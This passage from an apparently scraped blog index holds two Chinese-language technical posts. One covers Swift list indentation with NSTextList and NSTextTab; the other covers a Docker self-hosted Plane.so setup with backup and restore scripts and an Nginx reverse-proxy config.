tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;/ol&gt; &lt;/li&gt;&lt;/ul&gt;在瀏覽器中的顯示效果：如上圖所示，列表支援多層巢狀結構，並且需要照層級縮排。那時候因為還有許多其他 HTML 標籤轉換的工作需要實現，工作量很大；只快速嘗試用 NSTextList or NSTextTab 組合出列表縮排，沒有深入了解；但結果不如預期，間距過大、沒有對齊、多行會跑掉、巢狀結構不明顯、無法控制間距，稍微玩了一下試不出解答就放棄，暫時用土炮方式排版：如上圖效果很差，因為其實是自己用空白跟符號 － 手動排版， 無縮排效果 ，唯一好處只有間距是空白符號組成，大小可以自己控制。這件事就這樣不了了之了，開源了一年多也沒特別去改他；直到最近陸續收到希望能完善 List 轉換的 Issues 並且有開發者提供 解法 PR ，參考該 PR 中的 NSParagraphStyle 使用方式，才讓我又重新有了新的啟發；研究好 NSTextList 或 NSTextTab 是有機會完美實現縮排列表功能的！最終成果照慣例先上最終成果圖。 現在已可以在 ZMarkupParser ~&gt; v1.9.4 以上版本，完美轉換 HTML List Item 成 NSAttributedString 物件。 支持換行保持縮排 支持自訂縮排間距大小 支持巢狀結構縮排 支持不同 List Item Style 列表樣式，如 Bullet, Disc, Decimal…甚至客製化符號 以下正文開始。NSTextList 或 NSTextTab 實現列表縮排方法探究是「或」不是「與」 NSTextList 和 NSTextTab 沒有一起使用的關係，兩個屬性個別都能實現列表縮排功能。方法(1) 使用 NSTextList 實現列表縮排方法探究let listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.textLists = [textListLevel1] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.textLists = [textListLevel1, textListLevel2] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2))\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3))\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4))\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])) textView.attributedText = attributedString顯示效果：NSTextList 提供的 Public API 非常稀少，能控制的參數也就這些：// 項目顯示樣式var markerFormat: NSTextList.MarkerFormat { get }// 有序項目數字起始，從幾開始var startingItemNumber: Int// 是否為有序數字項目 (iOS &gt;= 16 才可用，這 API 居然有在更新)@available(iOS 16.0, *)open var isOrdered: Bool { get }// 回傳項目符號字串，itemNumber 帶入項目編號，如果為非有序數字項目則可省略open func marker(forItemNumber itemNumber: Int) -&gt; StringNSTextList.MarkerFormat 樣式對照： 為增加識別度，以項目列表位置 8 展示。使用方式：// 定義一個 NSMutableParagraphStylelet listLevel1ParagraphStyle = NSMutableParagraphStyle()// 定義 List Item 樣式, 項目起始位置let textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)// 賦予 NSTextList 到 textLists ArraylistLevel1ParagraphStyle.textLists = [textListLevel1]//NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\項目一\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])// 增加巢狀子項目：// 定義子項目 List Item 樣式, 項目起始位置let textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1)// 定義子項目 NSMutableParagraphStylelet listLevel2ParagraphStyle = NSMutableParagraphStyle()// 賦予 母,子 NSTextList 到 textLists ArraylistLevel1ParagraphStyle.textLists = [textListLevel1, textListLevel2]NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\項目一之一\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle])// 巢狀子項目的子項目...繼續 append NSTextList 到 textLists array 即可 使用 \\n 區別每個列表項目 使用 \\t項目符號\\t ，目的是讓 attributedString.string 存取純文字字串時也能得到列表結果。 \\t項目符號\\t 不會顯示出來，因此在項目符號後做什麼加工都不會顯示 (e.g. 例如加上 . ，並不會影響顯示)使用上的問題： 無法控制項目符號左右間距大小 無法客製化項目符號、數字項目無法加上 . -&gt; 1. 有發現若母項目列表是非有序項目 (如： .cicrle )，子項目是有序數字項目 (如： .decimal ) 時，子項目的 startingItemNumber 設定會失效NSTextList 能做的、可以做的就如同上述，在實際產品開發應用上並不是那麼的好用；間距太寬、數字項目沒有 . 大大減少實用性，網路上也只找到 透過 TextKit NSTextStorage 改變間距 的方式，我覺得這方式太 hard-coding 了，放棄；唯一好處是可以間單的透過 Append textLists array 增加巢狀縮排子項目列表，不需要計算複雜的排版問題。方法(2) 使用 NSTextTab 實現列表縮排方法探究NSTextTab 可以讓我們設定 \\t Tab 的佔位 位置 ，預設間隔為 28 。我們透過設定 NSMutableParagraphStyle 的 tabStops + headIndent + defaultTabInterval 來達成仿項目列表的效果。let textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)let textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1) let listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.defaultTabInterval = 28listLevel1ParagraphStyle.headIndent = 29listLevel1ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 8), // 對應設定如圖 (1) Location NSTextTab(textAlignment: .left, location: 29), // 對應設定如圖 (2) Location] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.defaultTabInterval = 28listLevel2ParagraphStyle.headIndent = 44listLevel2ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 29), // 對應設定如圖 (3) Location NSTextTab(textAlignment: .left, location: 44), // 對應設定如圖 (4) Location] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1)).\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2)).\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3)).\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4)).\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))textView.attributedText = attributedString tabStops Array 會對應文本中的每一個 \\t 符號， NSTextTab 可設定 Alignment 方向、Location 位置 ( 請注意不是設定寬度，是文本中中的位置！ ) headIndent 設定第二行開始距離起始點的位置，通常設為第二個 \\t 的 Location，這樣換行才能對齊項目符號。 defaultTabInterval 設定預設 \\t 的 Interval 間距，如果文字中還有其他 \\t 會依照此設定拉開間距。 location: 因為 NSTextTab 是指定方向與位置的，因此需要自行計算出位置；要計算項目符號寬度(位數也會影響) +間距+母項目內縮的距離，才能排出如上圖的效果。 項目符號完全可自訂 如果 location 有誤或無法符合，會出現直接的斷行上面的範例為了讓大家理解 NSTextTab 排版的方式，因此直接簡化了計算加總過程，把答案寫上去，如果要用在實際場景可參考以下完整程式碼：let attributedStringFont = UIFont.systemFont(ofSize: UIFont.systemFontSize)let iterator = ListItemIterator(font: attributedStringFont) //let listItem = ListItem(type: .decimal, text: \"\", subItems: [ ListItem(type: .circle, text: \"List Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 2\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 3\", subItems: [ ListItem(type: .circle, text: \"List Level 2 - 1\", subItems: []), ListItem(type: .circle, text: \"List Level 2 - 2 fafasffsafasfsafasas\\tfasfasfasfasfasfasfasfsafsaf\", subItems: []) ]), ListItem(type: .circle, text: \"List Level 1 - 4\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 5\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 6\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 7\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 8\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 9\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 10\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 11\", subItems: [])])let listItemIndent = ListItemIterator.ListItemIndent(preIndent: 8, sufIndent: 8)textView.attributedText = iterator.start(item: listItem, type: .decimal, indent: listItemIndent)//private extension UIFont { func widthOf(string: String) -&gt; CGFloat { return (string as NSString).size(withAttributes: [.font: self]).width }}private struct ListItemIterator { let font: UIFont struct ListItemIndent { let preIndent: CGFloat let sufIndent: CGFloat } func start(item: ListItem, type: NSTextList.MarkerFormat, indent: ListItemIndent) -&gt; NSAttributedString { let textList = NSTextList(markerFormat: type, startingItemNumber: 1) return item.subItems.enumerated().reduce(NSMutableAttributedString()) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: textList, parentIndent: indent.preIndent, sufIndent: indent.sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } } private func iterator(parentTextList: NSTextList, parentIndent: CGFloat, sufIndent: CGFloat, item: ListItem, itemNumber:Int) -&gt; NSAttributedString { let paragraphStyle = NSMutableParagraphStyle() // e.g. 1. var itemSymbol = parentTextList.marker(forItemNumber: itemNumber) switch parentTextList.markerFormat { case .decimal, .uppercaseAlpha, .uppercaseLatin, .uppercaseRoman, .uppercaseHexadecimal, .lowercaseAlpha, .lowercaseLatin, .lowercaseRoman, .lowercaseHexadecimal: itemSymbol += \".\" default: break } // width of \"1.\" let itemSymbolIndent: CGFloat = ceil(font.widthOf(string: itemSymbol)) let tabStops: [NSTextTab] = [ .init(textAlignment: .left, location: parentIndent), .init(textAlignment: .left, location: parentIndent + itemSymbolIndent + sufIndent) ] let thisIndent = parentIndent + itemSymbolIndent + sufIndent paragraphStyle.headIndent = thisIndent paragraphStyle.tabStops = tabStops paragraphStyle.defaultTabInterval = 28 let thisTextList = NSTextList(markerFormat: item.type, startingItemNumber: 1) // return item.subItems.enumerated().reduce(NSMutableAttributedString(string: \"\\t\\(itemSymbol)\\t\\(item.text)\\n\", attributes: [.paragraphStyle: paragraphStyle, .font: font])) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: thisTextList, parentIndent: thisIndent, sufIndent: sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } }}private struct ListItem { var type: NSTextList.MarkerFormat var text: String var subItems: [ListItem]} 我們宣告一個簡單的 ListItem 物件封裝子列表項目，透過遞迴組合、計算出項目列表間距與內容。 NSTextList 只使用 marker 方法產生列表符號，也可以不使用改成自行實現 要加寬項目符號前後寬度可直接透過設置 preIndent , sufIndent 達成。 因為需要計算位置，要使用 Font 來計算寬度，所以文字需要設定 .font 確保計算正確完成一開始奢望可以直接使用 NSTextList 就能達成，但效果跟客製化程度都很差；最後還是只能靠土炮 NSTextTab 用控制 \\t 位置的方式自行組合項目符號來達成，有點麻煩，不過效果可以完美符合需求！ 目的達成了，但依然沒有完全掌握 NSTextTab 的知識(例如: 不同方向？Location 的相對位置？)；官方文件、網路資料實在太少，有緣再來研究了。本文完整範例下載工商一個幫你把 HTML String 轉換成 NSAttributedString 的小工具，並且支援客製化樣式指定、客製化標籤功能。參考資料 ObjC String Rendering / ObjC 中國 — 字符串渲染 這篇文章有完整 NSAttributedString 的應用範例，其中也有介紹列表、表格功能的實現。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 562 Total Views Last Statistics Date: 2025-08-15 | 458 Views on Medium." }, { "title": "Plane.so Docker Self-Hosted 自架紀錄", "url": "/posts/zrealm-dev/plane-so-docker-self-hosted-%E8%87%AA%E6%9E%B6%E7%B4%80%E9%8C%84-9903c9783a97/", "categories": "ZRealm Dev.", "tags": "ios-app-development, docker, nginx, project-management, self-hosted", "date": "2024-05-25 21:12:58 +0800", "snippet": "Plane.so Docker Self-Hosted 自架紀錄Plane Self-Hosted Docker 自架、備份、還原、Nginx Domain 反向代理設定教學️⚠️️️️⚠️️️️⚠️️️️2025 Update️ ⚠️️️️⚠️️️️⚠️️️️已不推薦使用 Plane.so，原因是 Plane.so 初期依靠開源專案與支援自架崛起，但在後續的版本終將許多功能都放入付費計畫中...", "content": "Plane.so Docker Self-Hosted 自架紀錄Plane Self-Hosted Docker 自架、備份、還原、Nginx Domain 反向代理設定教學️⚠️️️️⚠️️️️⚠️️️️2025 Update️ ⚠️️️️⚠️️️️⚠️️️️已不推薦使用 Plane.so，原因是 Plane.so 初期依靠開源專案與支援自架崛起，但在後續的版本終將許多功能都放入付費計畫中，即使是自架也需要購買憑證才能開通功能，就算是自架也會有使用者人數限制，已不符合當初的想像；另外就是收費計劃非常混亂，有終身、Pro、Business…難保就算花錢購買，會不會又推出新的方案，新功能又只在新方案之中。前言Plane.so 是一套免費開源且支援 Self-Hosted 自架的類似 Asana, Jira, Clickup 專案管理工具，成立於 2022 年，第一版於 2023 年釋出，目前扔在開發階段。詳細使用操作與開發流程結合介紹，請參考上篇文章「 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具 」本篇僅記錄 Plane.so 使用 Docker 自架的過程。Self-Hosted Plane 支援 Docker, K8s / Cloud, 私人地端 安裝 Self-Hosted 為 Community Edition (官方簡稱 CE) 版 Self-Hosted 不一定會包含所有 Cloud 版功能 Self-Hosted 版功能預設比照的是 Cloud 免費版， 若要使用其他功能依然要升級付費版 。 本文為 Docker + 私人地端安裝為例 目前官方不提供從 Cloud 匯出，匯入到 Self-Hosted 版本，只能自己透過 API 串接實現 官方提示：超過 50 位使用者需提升機器性能We have seen performance degradation beyond 50 users on our recommended 4 GB, 2vCPU infra. Increased infra will help with more users. 使用 AGPL-3.0 license 開源，第一版 2023/01 推出，目前扔持續在開發階段，尚未提供正式 Relase 版。 請注意開源, 支援 Self-Hosted 不等於免費。 文末有附上完整設定範例 Repo。Docker 安裝本文不多做介紹，請參考 官方 Docker 安裝方式 ，完成本地 Docker 環境安裝、設定，以下以 macOS Docker 為例。Plane @ Docker 安裝參考 官方手冊 。 建立目錄＆下載安裝 Scriptmkdir plane-selfhostcd plane-selfhostcurl -fsSL -o setup.sh https://raw.githubusercontent.com/makeplane/plane/master/deploy/selfhost/install.shchmod +x setup.sh2. 確保 Docker 環境安裝好＆ Docker 啟動中，執行 Script./setup.sh 輸入 1 進行安裝(下載 Images) 等待 Plane 使用到的 Images Pulled 完成 Images Pulled 完成後，進入 ./plane-app 資料夾打開 .env 設定檔案APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=80WEB_URL=http://localhostDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://localhost#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 預設使用 :80 Port 啟動 Plane 服務，如果有衝突可以修 Port 完成設置調整 (不建議直接更改 docker-compose.yml 因為日後 Plane 更新會直接覆蓋掉此檔案)Plane @ Docker 啟動 再次進入 ./setup.sh 輸入 2 啟動 Plane： 完成啟動，且確認都啟動成功後，打開網址 / god-mode/ 進行首次設定： 這邊設定的帳號密碼為最高管理權限(God/Admin Mode) 基於安全考量，密碼須包含特殊符號、超過 8 個字元、包含數字、大小寫英文，否則無法送出 此步驟未設定進入首頁登入會顯示 Instance not configured. Please contact your administrator.Plane God/Admin Mode 管理後台可以從 Plane 網址 /god-mode/ 進入，這邊可設定整個 Plane 服務的環境。General Settings：一般設定。Email： Email 通知 SMTP 設定懶得自己弄 SMTP Server 可以 直接使用 GMAIL SMTP 寄信： Host: smtp.gmail.com Port: 465 Sender email address: 信件顯示信箱 e.g. noreply@zhgchg.li Username: 你的 Gmail 帳號 Password: 你的 Gmail 密碼， 如果有兩階段驗證要使用應用程式密碼 。 如果設定完沒反應請檢查 Port, Email Security 對應設定 (TLS/STARTTLS: 使用端口 587、SSL: 使用端口 465) 另外有個發想，因為 Plane 暫時不支援 Slack 通知，因此其實也可以起一個 SMTP Server 殼將信件通知自己透過 Python 腳本轉換成 Slack 通知。AuthenticationPlane 服務登入使用驗證方式，如果要綁定只有 Google 組織內的信箱帳戶可使用，可以關閉「Password based login」只啟用「Google」登入功能，再從 Google 登入那邊產生僅限組織帳號內使用的登入 App 即可。Artificial IntelligenceAI 相關設定，目前功用不大，有埋 Key 就能在 Issue 上使用 AI 協助撰寫 Issue Description。Image in Plane同樣目前功用不大，有埋 Unsplash Key 就能在專案封面圖選擇時透過 Unsplash API 抓取圖片並套用。 ⚠️⚠️聲明⚠️⚠️ 以上是 2024–05–25 v0.20-Dev 版的使用介紹，官方仍如火如荼開發新功能與優化使用者體驗，請以最新版的設定為主。 God/Admin Mode 設定好之後就差不多能如同使用 Cloud 版一樣使用。 詳細使用操作與開發流程結合介紹，請參考上篇文章「 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具 」Plane @ Docker 升級如同前述，Plane 仍處於開發階段，約每兩到三週會釋出新版，更動內容可能也會蠻巨大的；建議詳細閱讀 Release Note 改動與需要調整的設定，確定沒問題後再進行升級。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 因 Plane 處在開發階段，不穩定，不能保證升級不會造成資料遺失，因此建議操作前務必備份，備份方式下方會說明。升級方式： 再次進入 ./setup.sh 輸入 5 升級 Plane (其實也就只是拉新的 Images 下來 &amp; Restart) Images Pulled 完成後可以 Restart 重啟服務 升級後 .env 可能有所更動，請參考 Release Note 進行調整Plane @ Docker 備份自 0.20-dev 開始 ./setup.sh 新增一個 Backup Data 指令，但 翻閱官方手冊 ，只提到如何把 Backup Data Restore 到他們的 One 收費服務上；因此這邊還是用我自己土炮備份上傳檔案、Redis、備份 Postgresql Docker Container 的方式。備份腳本./plane-backup.sh :#!/bin/bash# 備份 Plane 資料# Author: zhgchgli (https://zhgchg.li)##### 執行方式# ./plane-backup.sh [備份到目標資料夾路徑] [Plane 的 Docker 專案名稱] [Plane 備份檔案最大保留數量，超過刪除最舊的備份]# e.g. ./plane-backup.sh /backup/plane plane-app 14###### 設定# 備份到目標資料夾backup_dir=${1:-.}# Plane 的 Docker 專案名稱docker_project_name=${2:-\"plane-app\"}# Plane 備份檔案最大保留數量，超過刪除最舊的備份keep_count=${3:-7}####### 檢查目錄是否存在if [ ! -d \"$backup_dir\" ]; then echo \"備份失敗，目錄不存在：$backup_dir\" exit;fi# Remove oldestcount=$(find \"$backup_dir\" -mindepth 1 -type d | wc -l)while [ \"$count\" -ge $keep_count ]; do oldest_dir=$(find \"$backup_dir\" -mindepth 1 -maxdepth 1 -type d | while read dir; do # 使用 stat 命令獲取修改時間 if [[ \"$OSTYPE\" == \"darwin\"* ]]; then # macOS 系統 echo \"$(stat -f %m \"$dir\") $dir\" else # Linux 系統 echo \"$(stat -c %Y \"$dir\") $dir\" fi done | sort -n | head -n 1 | cut -d ' ' -f 2-) echo \"Remove oldest backup: $oldest_dir\" rm -rf \"$oldest_dir\" count=$(find \"$backup_dir\" -mindepth 1 -type d | wc -l)done## Backup newdate_dir=$(date \"+%Y_%m_%d_%H_%M_%S\")target_dir=\"$backup_dir/$date_dir\"mkdir -p \"$target_dir\"echo \"Backuping to: $target_dir\"# Plane's Postgresql .SQL dumpdocker exec -i $docker_project_name-plane-db-1 pg_dump --dbname=postgresql://plane:plane@plane-db/plane -c &gt; $target_dir/dump.sql# Plane's redisdocker run --rm -v $docker_project_name-redis-1:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_redis.tar /volume &gt; /dev/null 2&gt;&amp;1# Plane's uploaded filesdocker run --rm -v ${docker_project_name}_uploads:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_uploads.tar /volume &gt; /dev/null 2&gt;&amp;1echo \"Backup up Success!\"第一次建立 Script 檔案記得先： chmod +x ./plane-backup.sh執行方式：./plane-backup.sh [備份到目標資料夾路徑] [Plane 的 Docker 專案名稱] [Plane 備份檔案最大保留數量，超過刪除最舊的備份] 備份到目標資料夾路徑: e.g /backup/plane/ or ./ Plane 的 Docker 專案名稱: Plane Docker Compose Project 名稱 Plane 備份檔案最大保留數量，超過刪除最舊的備份: 預設 7 份執行範例：./plane-backup.sh /backup/plane plane-app 14 執行時要確保 Plane 是啟動中的狀態。只要將以上指令加入 Crontab 就能定時自動備份 Plane。 如果遇到執行錯誤，找不到 Container 請確認 Plane Docker Compose Project 名稱 或檢查腳本與 Docker 的容器名稱 (可能官方改名了)。還原腳本./plane-restore.sh :#!/bin/bash# 恢復 Plane 備份資料# Author: zhgchgli (https://zhgchg.li)##### 執行方式# ./plane-restore.sh# inputBackupDir() { read -p \"欲恢復的 Plane 備份檔案資料夾 (e.g. /backup/plane/2024_05_25_19_14_12): \" backup_dir}inputBackupDirif [[ -z $backup_dir ]]; then echo \"請提供備份資料夾 (e.g. sh /backup/docker/plane/2024_04_09_17_46_39)\" exit;fiinputDockerProjectName() { read -p \"Plane 的 Docker 專案名稱 (留空使用預設 plane-app): \" input_docker_project_name}inputDockerProjectName docker_project_name=${input_docker_project_name:-\"plane-app\"}confirm() { read -p \"您確定要執行 Restore Plane.so 資料? [y/N] \" response # Check the response case \"$response\" in [yY][eE][sS]|[yY]) true ;; *) false ;; esac}if ! confirm; then echo \"Action cancelled.\" exitfi# 恢復echo \"Restoring...\"docker cp $backup_dir/dump.sql $docker_project_name-plane-db-1:/dump.sql &amp;&amp; docker exec -i $docker_project_name-plane-db-1 psql postgresql://plane:plane@plane-db/plane -f /dump.sql# 恢復 Redisdocker run --rm -v ${docker_project_name}-redis-1:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_redis.tar --strip-component=1 -C /volume# 恢復上傳的檔案docker run --rm -v ${docker_project_name}_uploads:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_uploads.tar --strip-component=1 -C /volumeecho \"Restore Success!\"第一次建立 Script 檔案記得先： chmod +x ./plane-restore.sh執行方式： ./plane-restore.sh輸入：欲恢復的 Plane 備份檔案資料夾 (e.g. /backup/plane/2024_05_25_19_14_12)輸入：Plane 的 Docker 專案名稱 (留空使用預設 plane-app)輸入：您確定要執行 Restore Plane.so 資料? [y/N] y看到 Restore Success! 成功後，需要重啟 Plane 才會生效。使用 Plane ./setup.sh 輸入 4 Restart：回到網站上重新整理、登入 Workspace 檢查是否恢復成功：完成！ ⚠️建議備份、還原流程要定期測試，確保出意外時備份能派上用場。Plane @ Docker 升級如同前述，Plane 仍處於開發階段，約每兩到三週會釋出新版，更動內容可能也會蠻巨大的；建議詳細閱讀 Release Note 改動與需要調整的設定，確定沒問題後再進行升級。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 因 Plane 處在開發階段，不穩定，不能保證升級不會造成資料遺失，因此建議操作前務必備份。升級方式： 再次進入 ./setup.sh 輸入 5 升級 Plane (其實也就只是拉新的 Images 下來 &amp; Restart) Images Pulled 完成後可以 Restart 重啟服務 升級後 .env 可能有所更動，請參考 Release Note 進行調整 升級完成務必檢查排成備份腳本是否依然正常 如果 Container Name 有變動需更改備份、還原、下方介紹的 Nginx 反向代理腳本使用 Nginx + Plane 進行 Reverse Proxy 反向代理因為我們同時可能會有需多 Web 服務需要提供，例如： Self-Hosted LibreChat (ChatGPT) 、 Self-Hosted Wiki.js 、 Self-Hosted Bitwarden … 每個服務預設都需要 80 Port，如果我們不想在使用時在網址指定 Port，則可需要啟動一個 Docker Nginx 當作 Web 服務的反向代理。效果如下:chat.zhgchg.li -&gt; LibreChat :8082wiki.zhgchg.li -&gt; Wiki.js :8083pwd.zhgchg.li -&gt; Bitwarden :8084plane.zhgchg.li -&gt; Plane.so :8081要達成以上效果需要先把 ./plane-selfhost 目錄移動到一個統一目錄下，這邊取名 webServices 。最終目錄結構預覽：調整 webServices/plane-selfhost/plane-app/.env 環境設定檔案：APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=8081WEB_URL=http://plane.zhgchg.liDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://plane.zhgchg.li#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 將網址替換為我們想要的網址，以 plane.zhgchg.li 為例 NGINX_PORT 換成 8081 把原本的 80 讓改反向代理 NginxwebServices/ 下建立一個 docker-compose.yml 檔案用來放 Nginx：version: '3.8'services: webServices-nginx: image: nginx restart: unless-stopped volumes: - ./nginx/conf.d/plane.zhgchg.li.conf:/etc/nginx/conf.d/plane.zhgchg.li.conf ports: - 80:80 - 443:443 networks: - plane-app_default #plane 所使用的網路networks: plane-app_default: external: true 我們需要把 Plane app 的網路加入到 NginxwebServices/ 下建立 /conf.d 目錄＆ plane.zhgchg.li.conf 檔案：# For plane.zhgchg.li# http example:server { listen 80; server_name plane.zhgchg.li; client_max_body_size 0; location / { proxy_pass http://plane-app-proxy-1; # plane proxy-1 服務名稱 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }}# https &amp; http example:# server {# listen 443 ssl;# server_name plane.zhgchg.li;# #ssl# ssl_certificate /etc/nginx/conf/ssl/zhgchgli.crt; # 替換成你域名的 crt &amp; 記得把 key 加到 docker-compose.yml volumes Mount 進 Docker# ssl_certificate_key /etc/nginx/conf/ssl/zhgchgli.key; # 替換成你域名的 key &amp; 記得把 key 加到 docker-compose.yml volumes Mount 進 Docker# ssl_prefer_server_ciphers on;# ssl_protocols TLSv1.1 TLSv1.2;# ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 